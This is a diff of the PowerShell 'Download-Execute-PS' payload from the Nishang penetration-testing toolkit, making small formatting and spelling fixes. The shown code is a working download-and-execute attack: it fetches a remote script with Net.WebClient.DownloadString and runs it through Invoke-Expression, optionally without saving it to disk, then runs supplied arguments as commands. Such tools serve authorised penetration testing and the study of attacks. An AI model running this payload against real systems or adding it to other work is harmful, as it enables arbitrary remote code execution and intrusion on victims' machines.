@@ -1,4 +1,3 @@
-
 function Download-Execute-PS
 {
 <#
@@ -7,7 +6,7 @@ Nishang Payload which downloads and executes a powershell script.
 
 .DESCRIPTION
 This payload downloads a powershell script from specified URL and then executes it on the target.
-Use the -nowdownload option to avoid saving the script on the target. Otherwise, the script is saved with a random filename.
+Use the -Nodownload option to avoid saving the script on the target. Otherwise, the script is saved with a random filename.
 
 .PARAMETER ScriptURL
 The URL from where the powershell script would be downloaded.
@@ -30,7 +29,8 @@ The above command does not download the script file to disk and executes the evi
 http://labofapenetrationtester.com/
 https://github.com/samratashok/nishang
 #>
-    [CmdletBinding()] Param(
+    [CmdletBinding()]
+    Param (
         [Parameter(Position = 0, Mandatory = $True)]
         [String]
         $ScriptURL,
@@ -45,7 +45,7 @@ https://github.com/samratashok/nishang
     if ($nodownload -eq $true)
     {
         Invoke-Expression ((New-Object Net.WebClient).DownloadString("$ScriptURL"))
-        if($Arguments)
+        if ($Arguments)
         {
             Invoke-Expression $Arguments
         }
@@ -60,5 +60,3 @@ https://github.com/samratashok/nishang
         Invoke-Expression $pastevalue
     }
 }
-
-
